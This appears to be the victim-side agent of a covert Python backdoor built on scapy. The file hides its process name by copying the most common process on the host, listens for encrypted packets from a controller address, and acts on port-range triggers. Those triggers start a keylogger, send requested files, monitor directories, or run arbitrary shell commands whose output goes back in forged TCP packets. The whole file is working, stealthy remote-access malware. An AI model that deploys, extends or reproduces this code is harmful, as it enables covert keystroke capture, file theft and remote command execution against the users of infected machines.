from scapy.layers.inet import TCP, IP

from FileTransfer import FileTransfer
import argparse
import sys
from scapy.all import *
from scapy.layers.l2 import Ether
from cryptography.fernet import Fernet
from multiprocessing import Process, Value
import socket
import setproctitle

from Monitor import Monitor

from Keylogger import Keylogger

FERNET = None
HOST_IP = "127.0.0.1"
ether = Ether()

FILETRANSFER = None
MONITOR = None
KEYLOGGER = None
Monitor_signal = Value("i", 0)
Keylogger_signal = Value("i", 0)


def verify_root():
    if os.getuid() != 0:
        exit("Not running in root/sudo")


def mask():
    command = os.popen("ps alx | awk '{ print $13 }' | uniq -c | sort -n | tail -n1 | awk '{ print $2}'")
    commandName = command.read()
    setproctitle.setproctitle(commandName)
    print(f"process: {commandName}")


def createFernetKey():
    key = Fernet.generate_key()
    with open("fernet.key", 'wb') as file:
        file.write(key)


def verifyIP(ip):
    try:
        if ip is None:
            print("IP address is invalid.")
        else:
            socket.inet_aton(ip)
            return True
    except socket.error:
        print("IP address is invalid.")
        return False


def execute_command(pkt):
    command = FERNET.decrypt(pkt["Raw"].load).decode()
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               stdin=subprocess.PIPE)
    output, err = process.communicate()
    data = output + err

    ptks = forgeptk(data)

    for ptk in ptks:
        sendp(ptk, verbose=0)


def forgeptk(data):
    global CLIENT
    MAX_DATA_LENGTH = 500
    ptks = [Ether() / IP(dst=HOST_IP) / TCP(sport=RandNum(60000, 65535), dport=RandNum(5000, 10000), flags='E')
            / Raw(FERNET.encrypt(data[i:i+MAX_DATA_LENGTH]))
            for i in range(0, len(data), MAX_DATA_LENGTH)]

    return ptks


def start_keylogger(pkt):
    command = FERNET.decrypt(pkt["Raw"].load).decode()
    if command == "Start keylogger":
        if not KEYLOGGER.isActive:
            Keylogger_signal.value = 1
            key_proc = Process(target=KEYLOGGER.start, args=(Keylogger_signal,))
            key_proc.daemon = True
            key_proc.start()


def stop_keylogger(pkt):
    command = FERNET.decrypt(pkt["Raw"].load).decode()
    if command == "Stop keylogger":
        Keylogger_signal.value = 0
        KEYLOGGER.stop()


def file_transfer(pkt):
    path = FERNET.decrypt(pkt["Raw"].load).decode()
    FILETRANSFER.setPath(path)
    FILETRANSFER.send()


def start_monitoring(pkt):
    path = FERNET.decrypt(pkt["Raw"].load).decode()
    MONITOR.set_path(path)
    Monitor_signal.value = 1
    mon_proc = Process(target=MONITOR.start, args=(Monitor_signal,))
    mon_proc.daemon = True
    mon_proc.start()


def stop_monitoring(pkt):
    command = FERNET.decrypt(pkt["Raw"].load).decode()
    if command == "Stop monitoring":
        Monitor_signal.value = 0
        MONITOR.stop()


def recv(pkt):
    try:
        if 5000 <= pkt["TCP"].sport < 5500 and 10000 <= pkt["TCP"].dport < 15000:
            start_keylogger(pkt)
        elif 5500 <= pkt["TCP"].sport < 6000 and 15000 <= pkt["TCP"].dport < 20000:
            stop_keylogger(pkt)
        elif 6000 <= pkt["TCP"].sport < 7000 and 20000 <= pkt["TCP"].dport < 30000:
            file_transfer(pkt)
        elif 7000 <= pkt["TCP"].sport < 7500 and 30000 <= pkt["TCP"].dport < 35000:
            start_monitoring(pkt)
        elif 7500 <= pkt["TCP"].sport < 8000 and 35000 <= pkt["TCP"].dport < 40000:
            stop_monitoring(pkt)
        elif 8000 <= pkt["TCP"].sport < 9000 and 40000 <= pkt["TCP"].dport < 50000:
            execute_command(pkt)

    except TypeError or AttributeError as error:
        print(error)


if __name__ == '__main__':
    mask()
    parser = argparse.ArgumentParser()

    parser.add_argument("-s", "--Server", help="IPv4 address of the receiving server")
    args = parser.parse_args()
    if args.Server:
        HOST_IP = args.Server

    if not verifyIP(HOST_IP):
        sys.exit(-2)

    try:
        with open('fernet.key', 'rb') as keyfile:
            key = keyfile.read()
        FERNET = Fernet(key)
    except FileNotFoundError:
        createFernetKey()
        with open('fernet.key', 'rb') as keyfile:
            key = keyfile.read()
        FERNET = Fernet(key)

    FILETRANSFER = FileTransfer(HOST_IP, FERNET)
    MONITOR = Monitor(HOST_IP, FERNET)
    KEYLOGGER = Keylogger(HOST_IP, FERNET)

    sniff(filter="tcp src portrange 5000-10000 and tcp dst portrange 10000-65535 and src host " + HOST_IP, prn=recv)
